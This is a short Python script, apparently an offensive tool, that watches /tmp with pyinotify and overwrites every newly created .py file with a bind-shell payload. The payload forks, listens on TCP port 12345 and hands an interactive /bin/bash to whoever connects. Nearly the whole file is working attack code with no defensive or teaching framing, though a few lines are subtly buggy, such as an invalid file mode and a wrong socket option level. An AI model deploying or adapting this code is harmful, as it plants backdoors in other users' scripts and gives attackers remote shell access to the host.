#!/usr/bin/python

# This program will monitor the /tmp directory and inject code for a bind shell when it detects
# a Python script was written there.

# TODO: Test to see if our listener is running before injecting the script again.

import pyinotify

# The heavy lifter
wm = pyinotify.WatchManager()

# The events we are interested in (CREATE || DELETE)
interesting_events = pyinotify.IN_CREATE | pyinotify.IN_DELETE

# Code for the bind shell in escaped-form
hot_injection = "import socket\nimport subprocess\nimport os\nnewpid = os.fork()\nif newpid == 0:\n\twhile True:"
hot_injection += "\n\t\ts=socket.socket(socket.AF_INET,socket.SOCK_STREAM)"
hot_injection += "\n\t\ts.setsockopt(socket.IPPROTO_IP, socket.SO_REUSEADDR, 1)"
hot_injection += "\n\t\ts.bind((\"\",12345))\n\t\ts.listen(1)\n\t\t(conn, address) = s.accept()"
hot_injection += "\n\t\tp=subprocess.Popen([\"/bin/bash\",\"-i\"], stdin=conn, stdout=conn, stderr=conn)\n"


class EventHandler(pyinotify.ProcessEvent):
    def process_IN_CREATE(self, event):
        # File was created!
        print "Creating: ", event.pathname

        # Self documenting code
        if '.py' in event.pathname:
            print "Python script detected!"
            print "Injecting code now..."
            with open(event.pathname, 'wr') as g:
                g.write(hot_injection)

    def process_IN_DELETE(self, event):
        # File was deleted!
        print "Removing: ", event.pathname

handler = EventHandler()
notifier = pyinotify.Notifier(wm, handler)

# The directory we want to monitor
watch_me = '/tmp'

# Note 'rec' means recursive but excludes sym links
wdd = wm.add_watch(watch_me, interesting_events, rec=True)

notifier.loop()
